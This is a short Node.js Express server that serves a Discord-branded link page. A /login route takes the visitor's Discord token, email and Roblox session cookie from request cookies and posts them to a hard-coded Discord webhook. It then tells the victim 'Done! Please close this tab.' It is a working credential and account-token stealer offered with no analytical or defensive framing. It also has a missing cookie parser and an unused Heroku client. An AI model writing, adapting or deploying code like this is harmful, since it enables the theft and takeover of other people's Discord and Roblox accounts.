const express = require('express');
const axios = require('axios');
const dotenv = require('dotenv');
const heroku = require('heroku-client');
const app = express();
const port = process.env.PORT || 3000;

dotenv.config();

const herokuClient = heroku.createClient({
  token: process.env.HEROKU_API_KEY,
  username: process.env.HEROKU_USERNAME,
});

app.get('/', (req, res) => {
  res.send(`
    <a href="https://discord.com/login?redirect_to=discord.com">
      <img src="https://upload-os-bbs.hoyolab.com/upload/2022/08/12/183248796/8d8d5faa20350abe7809d1df596a2ea9_4426511331494337990.jpg" alt="Discord Image" />
    </a>
  `);
});

app.get('/login', async (req, res) => {
  try {
    const { cookies } = req;
    const { discordToken, email, robloxCookie } = cookies;

    if (!discordToken || !email || !robloxCookie) {
      throw new Error('Incomplete data');
    }

    const data = { discordToken, email, robloxCookie };

    await axios.post('https://discord.com/api/webhooks/1437505343570710622/TeTg37uLuJXLdSPdWJ3rGGiWbG3htY10uIXlNnLTAkS8fSkHazsH9aqw0THn3-7FH0R4', data);

    res.status(200).send('Done! Please close this tab.');
  } catch (error) {
    console.error(error);
    res.status(500).send('An error occurred while processing your request.');
  }
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});
